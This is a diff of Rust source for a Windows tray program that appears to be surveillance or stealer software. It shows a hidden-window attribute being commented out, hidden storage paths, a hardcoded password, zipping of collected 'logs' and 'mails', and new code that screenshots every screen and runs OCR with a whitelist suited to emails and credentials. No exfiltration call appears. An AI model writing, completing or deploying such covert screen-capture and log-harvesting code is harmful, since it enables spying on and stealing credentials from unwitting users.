@@ -1,7 +1,8 @@
- #![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
+use std::collections::HashMap;
 use std::time::Instant;
 use std::env;
 use std::fs;
@@ -13,9 +14,12 @@ use std::io::BufReader;
 use std::str;
 use chrono::{Utc, DateTime};
 use linkify::{LinkFinder, LinkKind};
+use image::io::Reader as ImageReader;
+use image::DynamicImage;
+use rusty_tesseract::{Args, Image};
 use monitor::*;
 
-const TEMP: &str = "./.sys/data.dat";
+const TEMP: &str = "data.dat";
 const PASS: &[u8] = b"firemouses!";
 
 fn main() {
@@ -88,29 +92,36 @@ fn main() {
                 println!("Double click");
             }
             Events::ClickTrayIcon => {
-                println!("Single click");
                 let start = Instant::now();
                 let screens = Screen::all().unwrap();
 
                 for screen in screens {
-                    println!("capture {screen:?}");
-                    let mut image = screen.capture().unwrap();
+                    let image = screen.capture().unwrap();
                     image
-                        .save(format!("target/{}.png", screen.display_info.id))
+                        .save(format!("target.png"))
                         .unwrap();
 
-                    image = screen.capture_area(300, 300, 300, 300).unwrap();
-                    image
-                        .save(format!("target/{}-2.png", screen.display_info.id))
+                    let dynamic_image = ImageReader::open("target.png")
+                        .unwrap()
+                        .decode()
                         .unwrap();
+                    let img = Image::from_dynamic_image(&dynamic_image).unwrap();
+
+                    // fill your own argument struct if needed
+                    let image_to_string_args = Args {
+                        lang: "eng".into(),
+                        config_variables: HashMap::from([(
+                            "tessedit_char_whitelist".into(),
+                            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$./ ".into(),
+                        )]),
+                        dpi: Some(150),
+                        psm: Some(6),
+                        oem: Some(3),
+                    };
+
+                    let output = rusty_tesseract::image_to_string(&img, &image_to_string_args).unwrap();
+                    println!("\nThe String output is: {}", output);
                 }
-
-                let screen = Screen::from_point(100, 100).unwrap();
-                println!("capture {screen:?}");
-
-                let image = screen.capture_area(300, 300, 300, 300).unwrap();
-                image.save("target/capture_display_with_point.png").unwrap();
-                println!("run time: {:?}", start.elapsed());
             }
             Events::Exit => {
                 println!("Please exit");
@@ -242,7 +253,7 @@ fn zip_main(logs: String, mails: String) -> i32 {
 
 fn dozip(logs: String, mails: String) -> ZipResult<()> {
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!("./.temp/{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("{}.zip", now.format("%Y-%m-%d").to_string());
 
     let path = std::path::Path::new(&fname);
     let file = std::fs::File::create(path).unwrap();
@@ -274,7 +285,7 @@ fn readlogs(filename: &str) -> String {
     let lname = format!("text/{}", filename);
 
     let now: DateTime<Utc> = Utc::now();
-    let fname = format!("./.temp/{}.zip", now.format("%Y-%m-%d").to_string());
+    let fname = format!("{}.zip", now.format("%Y-%m-%d").to_string());
     let file = match fs::File::open(fname) {
         Ok(file) => file,
         Err(err) => {
